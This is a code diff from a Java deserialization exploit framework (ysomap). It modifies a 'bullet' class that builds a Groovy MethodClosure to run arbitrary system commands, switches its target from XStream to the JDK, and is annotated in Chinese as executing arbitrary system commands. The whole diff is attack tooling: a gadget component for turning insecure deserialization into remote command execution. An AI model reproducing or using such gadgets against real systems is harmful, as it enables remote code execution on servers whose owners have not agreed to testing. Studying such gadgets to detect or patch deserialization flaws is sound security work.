@@ -13,9 +13,9 @@ import ysomap.core.util.DetailHelper;
 @Bullets
 @Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
 @Details("执行任意系统命令")
-@Targets({Targets.XSTREAM})
+@Targets({Targets.JDK})
 @Authors({Authors.WH1T3P1G})
-public class ClosureWithRuntimeBullet extends AbstractBullet<Object> {
+public class ClosureWithRuntime2Bullet extends AbstractBullet<Object> {
 
     @NotNull
     @Require(name = "command", detail = DetailHelper.COMMAND)
@@ -23,12 +23,11 @@ public class ClosureWithRuntimeBullet extends AbstractBullet<Object> {
 
     @Override
     public Object getObject() throws Exception {
-        Runtime runtime = Runtime.getRuntime();
-        return new MethodClosure(runtime, "exec");
+        return new MethodClosure(command, "execute");
     }
 
     public static Bullet newInstance(Object... args) throws Exception {
-        ClosureWithRuntimeBullet bullet = new ClosureWithRuntimeBullet();
+        ClosureWithRuntime2Bullet bullet = new ClosureWithRuntime2Bullet();
         bullet.set("command", args[0]);
         return bullet;
     }
